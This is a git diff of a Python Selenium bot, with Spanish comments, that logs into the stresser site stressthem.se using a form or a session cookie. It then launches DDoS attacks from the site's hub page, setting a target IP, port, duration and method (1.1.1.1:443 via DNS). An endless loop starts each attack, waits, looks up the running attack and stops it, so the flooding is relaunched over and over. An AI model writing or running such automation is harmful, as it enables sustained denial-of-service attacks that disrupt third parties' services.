@@ -6,23 +6,48 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.support.ui import Select
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver import ChromeService, FirefoxService
+from selenium.common.exceptions import *
 
 import os
 import logging
 import requests
+import time
+import json
+
+from pages import Pages
 
 
-
+# TODO: hacer que saque estos datos de el config.json
 # Poner env vars si quiere login por formulario
 username = os.getenv("username")
 password = os.getenv("password")
 
-
-
-
 drivers = {
     "geckoDriver": "./drivers/geckodriver.exe",
     "chromeDriver": "./drivers/chromedriver.exe"
+}
+
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
+]
+
+
+# TODO: hacer un sistema de cookies con diferentes cuentas que las extraiga de un .json
+cookies = [
+    {
+        "name": "UID",
+        #"exp": os.getenv("coookie_exp"),
+        "value": os.getenv("cookie")
+    }
+]
+
+
+# TODO: hacer que saque estos datos de config.json
+info = {
+    "host": "1.1.1.1",
+    "port": 443,
+    "time": 20,
+    "method": "DNS"
 }
 
 logger = logging.getLogger('selenium')
@@ -32,38 +57,14 @@ logger.addHandler(handler)
 
 
 firefox_options = webdriver.FirefoxOptions()
-
-
-#firefox_options.add_argument("--headless")
+firefox_options.add_argument("--headless")
 
 
 service = FirefoxService(executable_path=drivers["geckoDriver"], log_output="./debug.log")
 
-
-# Poner cookies si quiere login por cookies
-cookies = [
-    {
-        "name": "UID",
-        #"exp": os.getenv("coookie_exp"),
-        "value": os.getenv("cookie")
-    }
-]
-
 driver = webdriver.Firefox(service=service, options=firefox_options)
-#driver.add_cookie(cookie_dict=cookies[0])
 
-class Pages:
-    def __init__(self) -> None:
-        pass
 
-    def index_page(self) -> None:
-        driver.get("https://www.stressthem.se")
-
-    def login_page(self) -> None:
-        driver.get("https://www.stressthem.se/login")
-
-    def DDoS_page(self) -> None:
-        driver.get("https://www.stressthem.se/hub")
 
 class Main(Pages):
     def __init__(self, driver: webdriver.Chrome) -> None:
@@ -77,6 +78,13 @@ class Main(Pages):
     def get_cookies(self) -> dict:
         cookies = self.driver.get_cookies()
         return {cookie['name']: cookie['value'] for cookie in cookies}
+
+    def restart_session(self):
+        self.driver.execute_script("location.reload();")
+
+    def close_button(self):
+        self.close_button= self.driver.find_element(By.CLASS_NAME, "close")
+        self.close_button.click()
 
     def login_form(self) -> any:
         self.login_page()
@@ -95,10 +103,6 @@ class Main(Pages):
             driver.add_cookie(cookie)
 
     def start_attack(self, ip: str, port: int, time: int, method: str):
-        self.DDoS_page()
-
-        self.button_telegram = self.driver.find_element(By.CLASS_NAME, "close")
-        self.button_telegram.click()
 
         self.ip_form = self.driver.find_element(By.ID, "host")
         self.ip_form.send_keys(ip)
@@ -111,23 +115,52 @@ class Main(Pages):
 
         self.method_form = Select(driver.find_element(By.ID, "method"))
         self.method_form.select_by_value(method)
+
         self.driver.implicitly_wait(1.0)
-        driver.execute_script("startAttack();")
+
+        self.driver.execute_script("startAttack();")
+        self.driver.implicitly_wait(1.0)
+
+        try:
+            self.restart_session()
+        except:
+            pass
+
 
     def get_running_attacks(self, cookies: dict):
         s = requests.session()
+
+        headers = {
+            'User-Agent': user_agents[0],
+            'Accept': '*/*',
+            'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Referer': 'https://www.stressthem.se/hub',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://www.stressthem.se',
+            'Connection': 'keep-alive',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'Content-Length': '0',
+            'TE': 'trailers'
+        }
+
         response = s.post(
             url="https://www.stressthem.se/request/hub/running/attacks",
+            headers=headers,
             cookies=cookies
 
         )
         if response.status_code == 200:
-            print("true")
-            print(response.cookies)
+            return response.json()
         else:
             print(f"Error en la solicitud. Código de estado: {response.status_code}")
-    def stop_attack(self, id):
-        ...
+    def stop_attack(self, id: any):
+        self.driver.execute_script("stopAttack();", id)
+        time.sleep(0.2)
+
+
     def driver_quit(self) -> any:
         driver.quit()
 
@@ -135,7 +168,18 @@ class Main(Pages):
 
 bot = Main(driver=driver)
 bot.login_form()
-
-bot.start_attack("1.1.1.1", 443, 300, "DNS")
-bot.get_running_attacks(bot.get_cookies())
+bot.DDoS_page()
+bot.close_button()
+i = 1
+while True:
+    i = i + 1
+    try:
+        bot.start_attack(info["host"], info["port"], info["time"], info["method"])
+        print(f"ejecución: {i}")
+        time.sleep(info["time"])
+        bot.stop_attack(bot.get_running_attacks(bot.get_cookies())["running"][0]["id"])
+    except Exception as e:
+        print(f"Error en ejecución: {i}\n   Error: {e}")
+    finally:
+        ...
 
